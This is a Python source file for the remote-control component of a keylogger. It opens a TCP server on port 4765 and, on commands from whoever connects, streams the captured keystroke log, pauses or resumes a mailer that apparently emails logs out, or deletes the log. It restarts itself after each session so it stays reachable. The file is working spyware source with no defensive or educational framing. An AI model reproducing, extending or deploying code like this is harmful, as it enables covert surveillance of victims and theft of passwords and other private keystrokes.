import socket
import threading
from get_local_addr import get_local_addr


class Server:

    s = None
    port = None
    conn = None
    addr = None
    parent = None

    def __init__(self, parent, port=4765):
        self.parent = parent
        self.port = port

        t = threading.Thread(target=self.start)
        t.daemon = False
        t.start()

    def start(self):
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.s.bind(('', 4765))
                self.s.listen()
                self.conn, self.addr = self.s.accept()
                self.conn.send('[+] Successfully connected'.encode())

                cmd = self.conn.recv(8).decode('utf-8')
                self.parse_cmd(cmd)
            except:
                self.conn.close()
                self.s.close()
                self.start()

    def parse_cmd(self, cmd):
        if cmd == 'getlog':
            self.send_klog()
        elif cmd == 'mailoff':
            self.mail_off()
        elif cmd == 'mailon':
            self.mail_on()
        elif cmd == 'rmlog':
            self.parent.logger.del_log()
            print('[+] Log deleted')
        self.conn.close()
        self.s.close()
        self.start()

    def mail_off(self):
        self.parent.mailer.pause()

    def mail_on(self):
        self.parent.mailer.unpause()

    def send_klog(self):
        self.parent.logger.pause()
        log = open(self.parent.logger.path, 'r')
        l = log.read(1024)
        while l:
            self.conn.send(l.encode())
            l = log.read(1024)
        log.close()
        self.parent.logger.unpause()
